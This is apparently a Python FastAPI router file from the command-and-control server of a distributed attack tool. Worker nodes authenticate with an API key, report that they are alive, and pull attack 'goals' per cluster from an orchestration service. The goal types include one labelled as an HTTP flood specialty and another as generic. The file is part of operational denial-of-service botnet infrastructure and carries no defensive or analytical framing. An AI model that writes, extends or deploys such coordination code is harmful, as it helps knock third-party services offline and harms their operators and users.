from fastapi import APIRouter, Request, HTTPException, Depends
from rvkinh_message_protocol import Worker, GoalHaru, GoalAkio, WorkerHaruSettings
from tekleo_common_utils import UtilsEnv
from services.service_liveness import ServiceLiveness
from services.service_attack_orchestration import ServiceAttackOrchestration


router_worker = APIRouter()
service_liveness = ServiceLiveness()
service_attack_orchestration = ServiceAttackOrchestration()


# Load API KEY
utils_env = UtilsEnv()
utils_env.load_environment_variables(['WORKER_API_KEY'])
worker_api_key = utils_env.get_environment_variable('WORKER_API_KEY')
if len(worker_api_key) == 0:
    print('resource_control: Warning!!! Worker api key was not specified')


# Default goals for stopped workers
GOAL_HARU_STOPPED = GoalHaru([], WorkerHaruSettings(-1, -1, '', -1))
GOAL_AKIO_STOPPED = GoalAkio("", "", -1)


# API KEY authentication method
def authorize_worker(request: Request) -> bool:
    if "Api-Key" not in request.headers:
        raise HTTPException(status_code=401, detail="Unauthorized")
    if request.headers["Api-Key"] != worker_api_key:
        raise HTTPException(status_code=401, detail="Unauthorized")
    return True


@router_worker.post("/worker/alive", response_model=bool)
def worker_alive(worker: Worker, authorized: bool = Depends(authorize_worker)) -> bool:
    return service_liveness.mark_alive(worker)


# THIS IS FOR HTTP FLOOD SPECIALITY
@router_worker.post("/worker/goal/haru", response_model=GoalHaru)
def worker_goal_haru(worker: Worker, authorized: bool = Depends(authorize_worker)) -> GoalHaru:
    attack_orchestration = service_attack_orchestration.get()
    if worker.cluster_id not in attack_orchestration.goal_haru_by_cluster_id:
        return GOAL_HARU_STOPPED
    else:
        return attack_orchestration.goal_haru_by_cluster_id[worker.cluster_id]


# THIS IS FOR GENERIC SPECIALITY
@router_worker.post("/worker/goal/akio", response_model=GoalAkio)
def worker_goal_akio(worker: Worker, authorized: bool = Depends(authorize_worker)) -> GoalAkio:
    attack_orchestration = service_attack_orchestration.get()
    if worker.cluster_id not in attack_orchestration.goal_akio_by_cluster_id:
        return GOAL_AKIO_STOPPED
    else:
        return attack_orchestration.goal_akio_by_cluster_id[worker.cluster_id]
